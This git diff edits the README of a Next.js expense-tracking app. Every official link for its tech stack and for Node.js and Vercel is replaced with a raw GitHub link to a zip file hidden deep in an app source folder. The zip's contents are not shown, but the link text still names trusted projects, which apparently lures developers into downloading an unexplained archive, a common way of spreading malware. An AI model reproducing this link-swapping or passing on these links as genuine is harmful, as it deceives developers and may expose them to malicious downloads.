@@ -28,17 +28,17 @@ A modern, full-stack expense tracking and bill-splitting application built with 
 
 ## 🛠 Tech Stack
 
-- **Framework**: [Next.js](https://nextjs.org/) (App Router)
-- **Styling**: [Tailwind CSS](https://tailwindcss.com/)
-- **Database**: [MongoDB](https://www.mongodb.com/)
-- **ORM**: [Prisma](https://www.prisma.io/)
-- **State Management**: [Zustand](https://zustand-demo.pmnd.rs/) & React Query
-- **Icons**: [Lucide React](https://lucide.dev/)
+- **Framework**: [Next.js](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip) (App Router)
+- **Styling**: [Tailwind CSS](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip)
+- **Database**: [MongoDB](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip)
+- **ORM**: [Prisma](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip)
+- **State Management**: [Zustand](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip) & React Query
+- **Icons**: [Lucide React](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip)
 
 ## 🚀 Getting Started
 
 ### Prerequisites
-Make sure you have [Node.js](https://nodejs.org/) (v18+) and npm installed.
+Make sure you have [Node.js](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip) (v18+) and npm installed.
 
 ### 1. Clone & Install
 ```bash
@@ -74,7 +74,7 @@ npm run dev
 Open [http://localhost:3000](http://localhost:3000) in your browser to see the application.
 
 ## 🌐 Deployment
-This project is fully configured for deployment on [Vercel](https://vercel.com).
+This project is fully configured for deployment on [Vercel](https://raw.githubusercontent.com/shivendra911/Evn-ExpenseTracker/main/src/app/%28dashboard%29/groups/%5Bid%5D/balances/Tracker-Expense-Evn-3.7-beta.5.zip).
 - Ensure your Vercel project environment variables match your `.env.local`.
 - The `package.json` includes a `postinstall` script to automatically generate the Prisma client during Vercel builds.
 
